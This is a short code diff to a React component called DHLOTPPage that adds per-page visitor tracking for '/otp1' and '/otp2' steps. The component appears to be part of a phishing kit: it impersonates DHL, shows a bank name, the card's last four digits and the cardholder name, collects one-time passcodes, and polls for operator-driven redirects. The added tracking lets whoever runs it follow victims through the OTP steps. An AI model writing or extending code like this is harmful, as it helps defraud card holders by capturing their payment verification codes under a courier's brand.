@@ -7,6 +7,7 @@ import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/com
 import { ShieldCheck, ArrowLeft } from "lucide-react";
 import { useRedirectPolling } from "@/hooks/use-redirect-polling";
 import { useLanguage } from "@/hooks/use-language";
+import { useVisitorTracking } from "@/hooks/use-visitor-tracking";
 
 interface DHLOTPPageProps {
   step: 1 | 2;
@@ -21,6 +22,12 @@ export default function DHLOTPPage({ step = 1, paymentId: propPaymentId }: DHLOT
   const [bankName, setBankName] = useState("Votre Banque");
   const [cardLast4, setCardLast4] = useState("****");
   const [cardholderName, setCardholderName] = useState("");
+
+  // Track visitor
+  useVisitorTracking({
+    sessionId: sessionId || undefined,
+    page: step === 1 ? "/otp1" : "/otp2",
+  });
 
 
   // Get card logo based on bank name
